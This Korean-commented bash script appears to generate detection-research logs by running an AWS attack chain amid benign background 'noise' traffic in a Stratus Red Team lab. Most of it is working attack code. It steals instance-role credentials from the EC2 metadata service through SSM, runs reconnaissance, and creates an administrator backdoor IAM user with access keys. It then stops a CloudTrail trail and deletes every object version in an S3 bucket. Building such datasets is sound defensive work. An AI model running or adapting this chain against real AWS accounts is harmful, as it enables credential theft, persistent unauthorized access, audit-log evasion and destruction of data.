#!/usr/bin/env bash
# =====================================================================
# 병행 실행기 — 노이즈 A/B를 백그라운드로 돌리면서 그 사이에 공격 체인을 실행
#   결과: 공격 이벤트가 '같은 엔티티의 정상 이벤트'에 묻힌 하나의 인터리브 로그
#   (연구 트레일 하나가 전부 기록하므로 병합 불필요)
#
# 준비(Phase A)는 CHAIN-option2-guide.md 2절을 먼저 끝낸 상태여야 한다:
#   - stratus warmup 3종 (steal-credentials / cloudtrail-stop / s3-ransomware-batch-deletion)
#   - 인스턴스 역할에 chain-pivot 정책 부착
#   - 연구 트레일 running + S3 데이터 이벤트 ON + 다중 리전
#
# 사용:
#   export OPS_PROFILE=<정상운영프로파일>      # 노이즈 B가 쓸 정상 신원 (없으면 default)
#   export AWS_DEFAULT_REGION=ap-northeast-2
#   ./chain_with_noise.sh
#
# 옵션(환경변수):
#   NOISE_DURATION(기본 900)  PREROLL(기본 60)  POSTROLL(기본 120)
#   OPS_INTERVAL(기본 5)      INST_INTERVAL(기본 10)
#   NO_NOISE=1 → 노이즈 없이 체인만   NO_ATTACK=1 → 노이즈만
# =====================================================================
set -uo pipefail
command -v jq >/dev/null || { echo "jq 필요 (sudo apt install jq / brew install jq)"; exit 1; }
REGION="${AWS_DEFAULT_REGION:-ap-northeast-2}"; export AWS_DEFAULT_REGION="$REGION"
NOISE_DURATION="${NOISE_DURATION:-900}"; PREROLL="${PREROLL:-60}"; POSTROLL="${POSTROLL:-120}"
OPS_INTERVAL="${OPS_INTERVAL:-5}"; INST_INTERVAL="${INST_INTERVAL:-10}"
HERE="$(cd "$(dirname "$0")" && pwd)"

echo "== 엔티티 자동 탐색 =="
INSTANCE_ID=$(aws ec2 describe-instances \
  --filters "Name=tag:StratusRedTeam,Values=true" "Name=instance-state-name,Values=running" \
  --query "Reservations[].Instances[].InstanceId | [0]" --output text)
ROLE_NAME=stratus-red-team-ec2-steal-credentials-role
DECOY_TRAIL=$(aws cloudtrail list-trails --query "Trails[?contains(Name,'ct-stop')].Name | [0]" --output text)
VICTIM_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name,'stratus-red-team-ransomware-bucket')].Name | [0]" --output text)
echo "  INSTANCE=$INSTANCE_ID  TRAIL=$DECOY_TRAIL  BUCKET=$VICTIM_BUCKET"
[ "$INSTANCE_ID" = "None" ] && { echo "인스턴스 없음 — Phase A warmup 먼저"; exit 1; }

NOISE_PIDS=()
start_noise() {
  [ "${NO_NOISE:-0}" = "1" ] && { echo "[noise] 생략(NO_NOISE=1)"; return; }
  echo "== 노이즈 시작 (지속 ${NOISE_DURATION}s) =="
  bash "$HERE/noise_instance.sh" "$INSTANCE_ID" "$VICTIM_BUCKET" "$NOISE_DURATION" "$INST_INTERVAL" || true
  AWS_PROFILE="${OPS_PROFILE:-default}" bash "$HERE/noise_ops.sh" \
    "$INSTANCE_ID" "$VICTIM_BUCKET" "$DECOY_TRAIL" "$NOISE_DURATION" "$OPS_INTERVAL" &
  NOISE_PIDS+=($!)
}
stop_noise() {
  for p in "${NOISE_PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done
  # 인스턴스 내부 루프(noise-A)는 SSM 타임아웃으로 자연 종료됨
}
trap stop_noise EXIT

start_noise
echo "== pre-roll ${PREROLL}s (공격 전 정상 트래픽 쌓기) =="; sleep "$PREROLL"

if [ "${NO_ATTACK:-0}" = "1" ]; then
  echo "== NO_ATTACK=1 → 노이즈만. post-roll 후 종료 =="; sleep "$POSTROLL"; exit 0
fi

echo "############ [1] Credential Access — 인스턴스 크리덴셜 탈취 ############"
cat > /tmp/steal.json <<'JSON'
{"commands":[
  "TOKEN=$(curl -sX PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 300')",
  "ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
  "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
]}
JSON
SCMD=$(aws ssm send-command --instance-ids "$INSTANCE_ID" --document-name AWS-RunShellScript \
  --parameters file:///tmp/steal.json --query "Command.CommandId" --output text)
aws ssm wait command-executed --command-id "$SCMD" --instance-id "$INSTANCE_ID" 2>/dev/null || true
OUT=$(aws ssm get-command-invocation --command-id "$SCMD" --instance-id "$INSTANCE_ID" --query "StandardOutputContent" --output text)
ASIA_AK=$(echo "$OUT" | jq -r .AccessKeyId); ASIA_SK=$(echo "$OUT" | jq -r .SecretAccessKey); ASIA_TK=$(echo "$OUT" | jq -r .Token)
[ "$ASIA_AK" = "null" ] && { echo "크리덴셜 추출 실패: $OUT"; exit 1; }
echo "  훔친 키(Cred①)=$ASIA_AK"
asia() { AWS_ACCESS_KEY_ID="$ASIA_AK" AWS_SECRET_ACCESS_KEY="$ASIA_SK" AWS_SESSION_TOKEN="$ASIA_TK" "$@"; }

echo "############ [2] Discovery — Cred①로 정찰 ############"
asia aws sts get-caller-identity
asia aws iam list-roles --max-items 50 >/dev/null 2>&1 || true
asia aws iam list-users --max-items 50 >/dev/null 2>&1 || true
asia aws s3 ls >/dev/null 2>&1 || true
asia aws s3 ls "s3://$VICTIM_BUCKET/" >/dev/null 2>&1 || true

echo "############ [3] PrivEsc/Persistence — Cred①로 관리자 백도어 생성 → Cred② ############"
asia aws iam create-user --user-name apt-backdoor-admin >/dev/null 2>&1 || true
asia aws iam attach-user-policy --user-name apt-backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
KEYJSON=$(asia aws iam create-access-key --user-name apt-backdoor-admin)
AKIA_AK=$(echo "$KEYJSON" | jq -r .AccessKey.AccessKeyId); AKIA_SK=$(echo "$KEYJSON" | jq -r .AccessKey.SecretAccessKey)
echo "  백도어 키(Cred②)=$AKIA_AK"
akia() { AWS_ACCESS_KEY_ID="$AKIA_AK" AWS_SECRET_ACCESS_KEY="$AKIA_SK" "$@"; }
sleep 8   # 새 키 전파 대기

echo "############ [4] Defense Evasion — Cred②로 decoy 트레일 중지 ############"
akia aws cloudtrail stop-logging --name "$DECOY_TRAIL" || true

echo "############ [5] Impact — Cred②로 victim 버킷 삭제 ############"
akia aws s3api list-object-versions --bucket "$VICTIM_BUCKET" \
  --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' --output json > /tmp/del.json 2>/dev/null || echo '{"Objects":[]}' > /tmp/del.json
if [ "$(jq '.Objects | length' /tmp/del.json)" -gt 0 ]; then
  akia aws s3api delete-objects --bucket "$VICTIM_BUCKET" --delete file:///tmp/del.json || true
else
  echo "  삭제할 객체 없음 (warmup 확인)"
fi

echo "== 공격 완료. post-roll ${POSTROLL}s (공격 후 정상 트래픽) =="; sleep "$POSTROLL"
echo "== 끝. 15분 뒤 로그 수집 → raw_log 에 넣기. 정리는 guide 5절 참고 =="
